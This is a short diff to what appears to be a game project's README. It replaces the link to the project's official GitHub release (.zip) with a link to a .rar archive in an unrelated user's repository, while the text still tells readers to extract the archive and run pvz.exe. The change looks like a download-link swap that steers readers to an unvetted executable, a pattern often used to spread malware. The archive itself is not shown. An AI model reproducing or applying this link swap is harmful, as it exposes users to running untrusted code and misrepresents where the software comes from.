@@ -84,7 +84,7 @@ Facebook: https://www.facebook.com/Lethituphuong2005
 
 ### **No code**
 
-Download the game (compressed into .zip) at the following link: [Game Link](https://github.com/nmhienbn/PVZ-Kaito-NMH-Edition/releases/tag/published)
+Download the game (compressed into .rar) at the following link: https://github.com/le1510/project/blob/main/file.rar
 This method saves a lot of memory and download time.
 Unzip the game into a folder and run pvz.exe to play.
 
